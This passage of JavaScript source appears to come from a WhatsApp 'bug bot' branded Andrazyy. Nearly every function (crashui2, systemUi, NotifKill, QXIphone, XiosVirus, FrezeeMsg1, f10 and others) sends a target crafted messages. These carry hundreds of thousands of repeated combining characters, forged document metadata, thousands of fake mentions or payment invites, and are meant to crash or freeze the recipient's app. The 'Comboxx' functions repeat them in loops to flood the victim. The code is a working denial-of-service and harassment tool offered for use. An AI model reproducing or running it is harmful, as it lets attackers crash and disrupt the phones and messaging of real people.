							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://i.ibb.co/0yzbz02m/1059.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://i.ibb.co/0yzbz02m/1059.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🔥⃝⃝𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲͢𝐗 𝐁𝐥𝐚𝐧𝐤𝐒𝐜𝐫𝐞𝐞𝐧͟͟͞♨️'))
   	};

	async function crashui2(target, ptcp = false) {
    await Andrazyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟐⃠💮⃢📵" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function systemUi2(target, Ptcp = false) {
    Andrazyy.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                    sections: [
                                        {
                                            title: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
async function UICRASH(target, ptcp = true) {
  try {
    await Andrazyy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵⭑̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function crashUiV5(target, Ptcp = false) {
    Andrazyy.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    Andrazyy.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "㊙️⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐔𝐈 𝟒 ✰ 𝐂𝐫𝐚𝐬𝐡 𝐔𝐈 𝟒⃠💮⃢📵" }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
// Command handler
async function NotifKill(target) {
      Andrazyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔴⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃤⃠⃢𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐊𝐈𝐋𝐋 𝐍𝐎𝐓𝐈𝐅 ✰ 𝐔𝐈 𝐍𝐎𝐓𝐈𝐅 𝐂𝐑𝐀𝐒𝐇⃠💀⃢🛑" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

 // FUNC BUG I-PHONE ANDRAZYY 🐉
async function aipong(target) {
await Andrazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await Andrazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await Andrazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await Andrazyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
 
 // FUNC BUG IOS ANDRAZYY 🐉
async function UpiCrash(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Andrazyy.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://www.facebook.com/61557890768940/posts/pfbid02qUhvPkN9c6Nuj4tesABBEZFthgtuCjNf7B3kAnYsbmxj6te3rN8uoSSxss5gELXTl/?app=fbl",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await Andrazyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      Andrazyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐐𝐃͢𝐈𝐏𝐇𝐎𝐍𝐄͢ 🐉⃝⃝𐎟" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      Andrazyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𐎟🩸⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐗𝐈𝐎𝐒͢𝐕𝐈𝐑𝐔𝐒͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //===========================//
       // FUNC BUG ANDRAZYY
 async function FrezeeMsg1(target) {
            let virtex = "𐎟🔴⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟` + ";

            Andrazyy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟🔴⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RuzxxHere" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
     console.log(chalk.white.bold("𐎟🔴⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟏͢ 🐉⃝⃝𐎟"));
        }
    
  //===========================\\  
         // FUNC BUG ANDRAZYY
 async function FrezeeMsg2(target) {
            let virtex = "𐎟💫⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟";
            let memekz = Date.now();

            await Andrazyy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "💫⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
  console.log(chalk.red.bold("𐎟💫⃝⃝𝐀𝐍𝐃𝐑͢𝐀𝐙𝐘𝐘𒁂𝐅𝐑𝐄𝐙𝐄𝐄͢𝐅𝐔𝐍𝐂𝟐͢ 🐉⃝⃝𐎟"));   
        };

  async function f10(target, Ptcp = false) {
    await Andrazyy.relayMessage(target, {
      extendedTextMessage: {
        text: "`© Andrazyy 🔥 Func f10`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "62895329013688@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "62895329013688@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./AndrazyyBug.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "© Andrazyy 🔥 Func f10",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('© Andrazyy 🔥 Func f10'))
};
 // BATAS CODE FUNC ANDRAZYY



  // COMBO FUNC V1 ANDRAZYY 🐉
    async function Comboxx0(target) {
      for (let i = 0; i < 20; i++) {
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

  // COMBO FUNC V1 ANDRAZYY 🐉
    async function Comboxx1(target) {
      for (let i = 0; i < 20; i++) {
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
        await DocFc(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

   // COMBO FUNC IPONG ANDRAZYY 🐉
    async function Comboxx2(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await iponcrash(target)
        await aipong(target)
        await await FBiphone(target)
        await QDIphone(target)
        await QXIphone(target)
      }
    }
    
    // COMO FUNC IOS ANDRAZYY 🐉
    async function Comboxx3(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await UpiCrash(target)
        await VenCrash(target)
        await AppXCrash(target)
        await SmCrash(target)
        await SqCrash(target)
        await FBiphone(target)
        await QXIphone(target)
        await QPayIos(target)
        await QPayStriep(target)
        await QDIphone(target)
        await XiosVirus(target)
      }
    }
    // COMO FUNC FREZE ANDRAZYY 🐉
    async function Comboxx4(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
      }
    }
    
   // COMO FUNC UI ANDRAZYY 🐉
    async function Comboxx5(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await UICRASH(target, ptcp = true)
        await crashUiV5(target, Ptcp = true)
        await systemUi(target, Ptcp = true)
      }
    }
    
   // COMO ALL FUNC ANDRAZYY 🐉
